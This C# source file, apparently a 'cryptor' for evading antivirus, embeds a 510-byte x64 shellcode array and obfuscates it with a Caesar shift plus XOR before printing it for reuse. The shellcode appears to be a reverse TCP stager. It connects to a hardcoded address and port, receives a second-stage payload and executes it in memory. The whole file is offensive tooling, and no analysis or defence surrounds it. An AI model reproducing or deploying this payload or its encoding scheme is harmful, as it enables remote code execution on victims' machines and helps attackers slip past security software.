﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cryptor_NET
{
    internal class Program
    {
        static byte[] encryptPayload(byte[] data)
        {
            byte[] encryptedPayload = new byte[data.Length];

            // caesar
            for (int i = 0; i < data.Length; i++)
            {
                encryptedPayload[i] = (byte)(((uint)data[i] + 14) & 0xFF);
            }

            // xor
            for (int i = 0; i < encryptedPayload.Length; i++)
            {
                encryptedPayload[i] = (byte)((encryptedPayload[i] ^ 'x'));
            }
            return encryptedPayload;
        }

        static byte[] decryptPayload(byte[] encryptedPayload)
        {
            byte[] data = new byte[encryptedPayload.Length];

            // xor
            for (int i = 0; i < encryptedPayload.Length; i++)
            {
                data[i] = (byte)((encryptedPayload[i] ^ 'x'));
            }

            // caesar
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(((uint)data[i] - 14) & 0xFF);
            }

            return data;
        }

        static void printPayload(byte[] payload)
        {
            StringBuilder hex = new StringBuilder(payload.Length * 2);
            int counter = 0;
            foreach (byte b in payload)
            {
                hex.AppendFormat("0x{0:x2}", b);
                if (counter < payload.Length-1)
                    hex.Append(", ");
                if ((counter+1) % 15 == 0)
                    hex.Append("\n");
                counter++;
            }
            Console.WriteLine("byte[] payload = new byte ["+payload.Length+"] { \n" + hex.ToString() + "}");
        }

        static void Main(string[] args)
        {
            byte[] payload = new byte[510] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,
0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,
0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
0x41,0x51,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,
0x48,0x01,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,
0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,
0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,
0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,
0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x40,0xc0,0xa8,0x2d,0xdc,
0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,
0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,
0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,
0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,
0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,
0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,
0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,
0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x00,
0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            byte[] encrypted = encryptPayload(payload);

            printPayload(encrypted);
            Console.WriteLine();

            byte[] decrypted = decryptPayload(encrypted);

            printPayload(decrypted);

            Console.ReadLine();
            Console.ReadLine();
            Console.WriteLine("[!] Press enter to continue...");
            Console.ReadLine();
        }

    }
}
